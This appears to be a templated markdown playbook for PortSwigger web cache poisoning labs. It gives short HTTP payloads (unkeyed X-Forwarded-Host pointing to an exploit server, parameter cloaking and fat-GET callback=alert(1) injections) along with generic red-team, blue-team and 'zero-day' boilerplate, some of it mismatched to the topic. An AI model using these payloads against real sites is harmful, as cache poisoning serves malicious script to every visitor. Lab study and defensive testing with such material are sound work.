---
name: "Web Cache Poisoning — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1557"]
tools: [burp-suite, curl, sqlmap, ffuf, python, hashcat, ysoserial]
difficulty: "advanced"
---

# Web Cache Poisoning — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- BSCP certification prep
- Real-world bug bounty hunting
- Building exploitation chains
- Understanding bypass techniques

## Prerequisites
- Burp Suite Professional
- Burp Collaborator / interactsh
- Browser with proxy configured


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Unkeyed header 🟡 PRACTITIONER
```http
GET / HTTP/1.1
X-Forwarded-Host: EXPLOIT-SERVER
```
Cache stores response with your malicious host in script/link tags.
---

### Lab 2: Unkeyed cookie 🟡 PRACTITIONER
```http
GET / HTTP/1.1
Cookie: fehost=EXPLOIT-SERVER"
```
---

### Lab 3: Multiple headers 🟡 PRACTITIONER
Combine `X-Forwarded-Host` + `X-Forwarded-Scheme: http` to force redirect to your server.
---

### Lab 4: Unknown header 🟡 PRACTITIONER
Use Param Miner to discover: `X-Host`, `X-Forwarded-Server`, etc.
---

### Lab 5: Unkeyed query string 🟡 PRACTITIONER
Query string excluded from cache key → add XSS in query, all users get poisoned response.
---

### Lab 6: Unkeyed query parameter 🟡 PRACTITIONER
Specific parameter excluded from cache key (e.g., `utm_content`). Inject XSS there.
---

### Lab 7: Parameter cloaking 🟡 PRACTITIONER
```
/js/geolocate.js?callback=setCountryCookie&utm_content=1;callback=alert(1)
```
Backend parser sees second `callback`, cache key only includes first.
---

### Lab 8: Fat GET request 🟡 PRACTITIONER
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Content-Length: 30

callback=alert(1)
```
GET with body — backend reads body param, cache uses URL param as key.
---

### Lab 9: URL normalization 🟡 PRACTITIONER
`/random</p><script>alert(1)</script><p>foo` — browser URL-encodes, cache doesn't → poisoned.
---

### Lab 10: DOM vuln via strict cache 🟡 PRACTITIONER
Find DOM XSS sink, poison cache to inject payload via unkeyed header/param.
---

### Lab 11: Combining vulnerabilities 🔴 EXPERT
Chain multiple unkeyed inputs together for exploitation.
---

### Lab 12: Cache key injection 🔴 EXPERT
Inject cache-key delimiter characters to control what gets cached.
---

### Lab 13: Internal cache poisoning 🔴 EXPERT
Target application-level cache (not CDN). Fragment-based caching reuses cached fragments across pages.
---



## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research
When standard technique fails:
1. Identify the filter/WAF
2. Fuzz with Burp Intruder custom wordlists
3. Search GitHub/Twitter for new bypasses
4. Chain with other vulns for escalation
5. Try encoding variants: URL, double-URL, unicode, hex


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.

## 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)
> The Architect Mindset identifies misconfigurations spanning multiple domains.
- Chain info-leaks with SSRF/RCE.
- Maintain absolute OPSEC during active engagement.

## 🏁 Execution Phase (Steps to Reproduce)
1. Perform target reconnaissance.
2. Formulate payload based on endpoints.
3. Execute the exploit and capture exfiltrated data.

**Severity Profile:** High (CVSS: 8.5)

## References
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
